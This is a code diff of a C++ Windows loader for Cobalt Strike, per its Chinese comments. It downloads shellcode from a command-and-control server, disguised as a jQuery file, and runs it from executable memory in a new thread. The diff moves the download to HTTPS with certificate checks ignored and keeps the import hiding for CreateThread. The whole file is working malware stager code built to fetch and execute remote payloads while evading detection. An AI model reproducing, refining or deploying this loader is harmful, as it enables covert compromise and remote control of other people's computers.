@@ -2,8 +2,11 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <Wininet.h>
+
 using namespace std;
+
 #pragma comment(lib,"wininet")
+
 typedef _Ret_maybenull_ _Post_writable_byte_size_(dwSize) LPVOID(WINAPI* PVA)(
     _In_opt_ LPVOID lpAddress,
     _In_     SIZE_T dwSize,
@@ -26,23 +29,23 @@ int main(int argc, char* argv[]) {
         if (nethandle == NULL) {
             printf("internet open error:%d\n", GetLastError());
             return 0;
-        } 
-        char* host = (char*)"192.168.211.129";//cs的ip
-        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);//使用https加密传输
+        }
+        char* host = (char*)"172.21.85.100";//cs的ip
+        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);//使用https加密传输
         if (Session == NULL)
         {
             printf("internet connect error:%d\n", GetLastError());
             return 0;
         }
-        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中64位的url地址
+        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中64位的url地址
         if (HttpRequest == NULL) {
             printf("http open request error:%d\n", GetLastError());
             return 0;
-        }
+        }        
         int dwFlags;
         int size = sizeof(dwFlags);
         InternetQueryOptionA(HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, (LPDWORD)&size);
-        dwFlags = dwFlags | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
+        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
         InternetSetOptionA(HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
         int ret = HttpSendRequestA(HttpRequest, NULL, 0, NULL, 0);
         if (ret == FALSE) {
@@ -74,14 +77,14 @@ int main(int argc, char* argv[]) {
         int length = atoi((const char*)contentL);
         cout << "length:" << length << "\n";
         if (ret == FALSE) {
-            printf("htttpqueryinfo error:%d\n", GetLastError());
+            printf("htttp query info error:%d\n", GetLastError());
             return 0;
         }
         void* c = VA(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//保存获取的文件，实现加载器
         int readed = 0;
         InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
-        char* cc = (char*)c + 11;//跳过配置文件前面追加字符
-        PCT ppct=(PCT)GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread");//隐藏导入api函数
+        char* cc = (char*)c + 10;//跳过配置文件前面追加字符
+        PCT ppct = (PCT)GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread");//隐藏导入api函数
         HANDLE ct = ppct(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);//执行
         WaitForSingleObject(ct, INFINITE);
         VirtualFree(c, length + 1, MEM_DECOMMIT);
